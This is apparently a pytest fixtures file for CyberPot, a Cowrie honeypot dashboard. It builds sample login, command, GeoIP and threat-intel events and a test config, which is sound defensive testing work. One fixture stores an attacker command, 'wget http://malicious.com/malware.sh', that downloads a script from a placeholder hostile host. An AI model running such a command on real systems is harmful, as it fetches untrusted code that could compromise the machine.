"""
Pytest configuration and shared fixtures for CyberPot tests.
"""

import json
from datetime import datetime
from ipaddress import ip_address
from pathlib import Path

import pytest

from cyberpot.core.models import (
    CommandEvent,
    Event,
    EventType,
    GeoIPData,
    LoginEvent,
    Severity,
    ThreatIntelData,
)


@pytest.fixture
def sample_ip():
    """Sample IP address for testing."""
    return ip_address("192.168.1.100")


@pytest.fixture
def sample_geoip_data():
    """Sample GeoIP data for testing."""
    return GeoIPData(
        country_code="US",
        country_name="United States",
        city="New York",
        latitude=40.7128,
        longitude=-74.0060,
        asn=15169,
        asn_org="Google LLC",
    )


@pytest.fixture
def sample_threat_intel_data():
    """Sample threat intelligence data for testing."""
    return ThreatIntelData(
        is_malicious=True,
        confidence_score=0.9,
        categories=["bruteforce", "scanner"],
        reports=10,
        sources=["blocklist", "greynoise"],
    )


@pytest.fixture
def sample_login_event(sample_ip):
    """Sample login event for testing."""
    return LoginEvent(
        timestamp=datetime.now(),
        event_type=EventType.LOGIN_FAILED,
        session_id="test_session_123",
        src_ip=sample_ip,
        src_port=12345,
        username="root",
        password="admin",
        success=False,
    )


@pytest.fixture
def sample_command_event(sample_ip):
    """Sample command event for testing."""
    return CommandEvent(
        timestamp=datetime.now(),
        event_type=EventType.COMMAND_EXECUTION,
        session_id="test_session_123",
        src_ip=sample_ip,
        src_port=12345,
        command="wget http://malicious.com/malware.sh",
    )


@pytest.fixture
def sample_cowrie_login_json():
    """Sample Cowrie JSON log line for login event."""
    return json.dumps({
        "eventid": "cowrie.login.failed",
        "timestamp": "2025-01-15T12:00:00.000000Z",
        "src_ip": "192.168.1.100",
        "src_port": 12345,
        "session": "test_session_123",
        "username": "root",
        "password": "admin",
    })


@pytest.fixture
def sample_cowrie_command_json():
    """Sample Cowrie JSON log line for command event."""
    return json.dumps({
        "eventid": "cowrie.command.input",
        "timestamp": "2025-01-15T12:00:00.000000Z",
        "src_ip": "192.168.1.100",
        "src_port": 12345,
        "session": "test_session_123",
        "input": "ls -la",
    })


@pytest.fixture
def temp_log_file(tmp_path):
    """Create temporary log file for testing."""
    log_file = tmp_path / "cowrie.json"
    log_file.write_text("")
    return log_file


@pytest.fixture
def sample_config_yaml(tmp_path):
    """Create sample configuration file for testing."""
    config_file = tmp_path / "config.yaml"
    config_content = f"""
cowrie:
  deployment: docker
  log_file: {tmp_path / "cowrie.json"}

storage:
  max_events: 1000
  max_sessions: 100

enrichment:
  geoip:
    enabled: false
  threat_intel:
    enabled: false

tui:
  enabled: true

irc:
  enabled: false

logging:
  level: INFO
"""
    config_file.write_text(config_content)
    return config_file
